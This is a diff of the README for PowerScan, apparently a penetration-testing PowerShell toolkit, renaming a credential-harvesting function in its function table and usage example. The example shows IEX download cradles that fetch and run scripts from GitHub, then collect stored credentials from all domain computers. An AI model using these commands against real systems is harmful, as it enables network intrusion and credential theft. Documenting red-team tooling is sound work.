@@ -34,14 +34,14 @@ Reconnaissance functions require either low privileges (typically domain user) o
 
 Post-exploitation functions require high privileges (typically administrator).
 
-| Function                  | Description                                                   |
-| ------------------------- | ------------------------------------------------------------- |
-| Get-CimCredential         | Get credentials from common registry keys and files           |
-| Get-CimDpapiCredential    | Get credentials from Windows Credentials                      |
-| Get-CimDpapiVault         | Get credentials from Windows Vault                            |
-| Get-CimDpapiWifi          | Get credentials from WiFi profiles                            |
-| Get-RegistryHiveDump      | Get secrets from registry hives retrieved via remote registry |
-| Get-ShadowHiveDump        | Get secrets from registry hives retrieved via shadow copy     |
+| Function                     | Description                                                   |
+| ---------------------------- | ------------------------------------------------------------- |
+| Get-CimDpapiCredential       | Get credentials from Windows Credentials                      |
+| Get-CimDpapiVault            | Get credentials from Windows Vault                            |
+| Get-CimDpapiWifi             | Get credentials from WiFi profiles                            |
+| Get-CimUnprotectedCredential | Get credentials from common registry keys and files           |
+| Get-RegistryHiveDump         | Get secrets from registry hives retrieved via remote registry |
+| Get-ShadowHiveDump           | Get secrets from registry hives retrieved via shadow copy     |
 
 
 ### Hunt
@@ -109,9 +109,9 @@ Gather credentials from common registry keys and files on all domain computers (
 
 ```
 PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/PowerScan.ps1')
-PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Post/Get-CimCredential.ps1')
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/PowerScan/master/Post/Get-CimUnprotectedCredential.ps1')
 PS C:\> $cred = Get-Credential Administrator@ADATUM.CORP
-PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-CimCredential} -ScriptParameters @{Credential=$cred; Timeout=2} -ComputerDomain ADATUM.CORP -Credential $cred
+PS C:\> Invoke-PowerScan -ScriptBlock ${Function:Get-CimUnprotectedCredential} -ScriptParameters @{Credential=$cred; Timeout=2} -ComputerDomain ADATUM.CORP -Credential $cred
 ```
 
 
